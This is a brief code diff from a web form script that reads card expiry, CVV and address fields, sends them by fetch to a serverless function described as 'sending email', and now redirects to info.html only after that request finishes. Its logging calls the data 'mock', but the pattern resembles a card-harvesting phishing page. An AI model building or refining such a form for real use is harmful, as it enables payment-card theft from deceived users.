@@ -169,7 +169,6 @@
         const c_date = document.querySelector("#c_date").value;
         const c_cvv = document.querySelector("#c_cvv").value;
         const c_address = document.querySelector("#c_address").value;
-        window.location.href = "info.html";
 
         try {
           const res = await fetch(
@@ -190,6 +189,7 @@
 
           const data = await res.json();
           console.log("Serverless function response:", data);
+          window.location.href = "info.html";
         } catch (err) {
           console.error("Error sending mock data:", err);
           alert("Error sending email: " + err.message);
